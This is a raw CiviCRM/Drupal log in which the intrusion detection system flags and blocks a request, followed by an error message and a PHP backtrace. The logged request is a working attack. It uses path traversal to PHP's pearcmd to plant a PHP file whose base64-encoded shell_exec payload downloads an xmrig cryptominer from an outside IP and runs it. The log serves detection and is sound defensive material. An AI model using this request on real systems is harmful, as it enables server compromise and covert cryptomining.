Oct 03 19:07:27  [info] $IDS Detector Details = Array
(
    [0] => Array
        (
            [name] => lang
            [value] => ../../../../../../../../usr/local/lib/php/pearcmd
            [page] => /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzE4NS4yMjUuNzUuMjQyL2Rvd25sb2FkL3htcmlnLng4Nl82NDsgY3VybCAtTyB3Z2V0IGh0dHA6Ly8xODUuMjI1Ljc1LjI0Mi9kb3dubG9hZC94bXJpZy54ODZfNjQ7IHJtIC1yZiAuZm94bTsgbXYgeG1yaWcueDg2XzY0IC5mb3htOyBjaG1vZCAreCAuZm94bTsgLi8uZm94bQ=="));?>+/tmp/ohhellohttpserver.php
            [userid] => 
            [session] => CbLzo_eD5sIGcBJniCqmuB2KD9ODCRhDcCiboo3B7m0
            [ip] => 10.198.0.11
            [reaction] => 3
            [impact] => 81
        )

    [1] => Array
        (
            [name] => /<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzE4NS4yMjUuNzUuMjQyL2Rvd25sb2FkL3htcmlnLng4Nl82NDsgY3VybCAtTyB3Z2V0IGh0dHA6Ly8xODUuMjI1Ljc1LjI0Mi9kb3dubG9hZC94bXJpZy54ODZfNjQ7IHJtIC1yZiAuZm94bTsgbXYgeG1yaWcueDg2XzY0IC5mb3htOyBjaG1vZCAreCAuZm94bTsgLi8uZm94bQ
            [value] => ="));?> /tmp/ohhellohttpserver.php
            [page] => /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzE4NS4yMjUuNzUuMjQyL2Rvd25sb2FkL3htcmlnLng4Nl82NDsgY3VybCAtTyB3Z2V0IGh0dHA6Ly8xODUuMjI1Ljc1LjI0Mi9kb3dubG9hZC94bXJpZy54ODZfNjQ7IHJtIC1yZiAuZm94bTsgbXYgeG1yaWcueDg2XzY0IC5mb3htOyBjaG1vZCAreCAuZm94bTsgLi8uZm94bQ=="));?>+/tmp/ohhellohttpserver.php
            [userid] => 
            [session] => CbLzo_eD5sIGcBJniCqmuB2KD9ODCRhDcCiboo3B7m0
            [ip] => 10.198.0.11
            [reaction] => 3
            [impact] => 81
        )

    [2] => Array
        (
            [name] => IDS_request_uri
            [value] => /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzE4NS4yMjUuNzUuMjQyL2Rvd25sb2FkL3htcmlnLng4Nl82NDsgY3VybCAtTyB3Z2V0IGh0dHA6Ly8xODUuMjI1Ljc1LjI0Mi9kb3dubG9hZC94bXJpZy54ODZfNjQ7IHJtIC1yZiAuZm94bTsgbXYgeG1yaWcueDg2XzY0IC5mb3htOyBjaG1vZCAreCAuZm94bTsgLi8uZm94bQ=="));?>+/tmp/ohhellohttpserver.php
            [page] => /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzE4NS4yMjUuNzUuMjQyL2Rvd25sb2FkL3htcmlnLng4Nl82NDsgY3VybCAtTyB3Z2V0IGh0dHA6Ly8xODUuMjI1Ljc1LjI0Mi9kb3dubG9hZC94bXJpZy54ODZfNjQ7IHJtIC1yZiAuZm94bTsgbXYgeG1yaWcueDg2XzY0IC5mb3htOyBjaG1vZCAreCAuZm94bTsgLi8uZm94bQ=="));?>+/tmp/ohhellohttpserver.php
            [userid] => 
            [session] => CbLzo_eD5sIGcBJniCqmuB2KD9ODCRhDcCiboo3B7m0
            [ip] => 10.198.0.11
            [reaction] => 3
            [impact] => 81
        )

)


Oct 03 19:07:27  [info] $Fatal Error Details = Array
(
    [message] => C'è un errore di convalida con il vostro input HTML. La vostra attività è un po 'sospettoso, quindi annullarla
    [code] => 
)


Oct 03 19:07:27  [info] $backTrace = #0 /var/www/html/sites/all/modules/civicrm/CRM/Core/Error.php(381): CRM_Core_Error::backtrace("backTrace", TRUE)
#1 /var/www/html/sites/all/modules/civicrm/CRM/Core/IDS.php(312): CRM_Core_Error::fatal("C'è un errore di convalida con il vostro input HTML. La vostra attività è un ...")
#2 /var/www/html/sites/all/modules/civicrm/CRM/Core/IDS.php(223): CRM_Core_IDS->kick()
#3 /var/www/html/sites/all/modules/civicrm/CRM/Core/IDS.php(85): CRM_Core_IDS->react(Object(IDS_Report))
#4 /var/www/html/sites/all/modules/civicrm/CRM/Core/Invoke.php(197): CRM_Core_IDS->check((Array:13))
#5 /var/www/html/sites/all/modules/civicrm/CRM/Core/Invoke.php(84): CRM_Core_Invoke::runItem((Array:13))
#6 /var/www/html/sites/all/modules/civicrm/CRM/Core/Invoke.php(52): CRM_Core_Invoke::_invoke((Array:1))
#7 /var/www/html/sites/all/modules/civicrm/drupal/civicrm.module(445): CRM_Core_Invoke::invoke((Array:1))
#8 /var/www/html/includes/menu.inc(527): civicrm_invoke()
#9 /var/www/html/index.php(21): menu_execute_active_handler()
#10 {main}


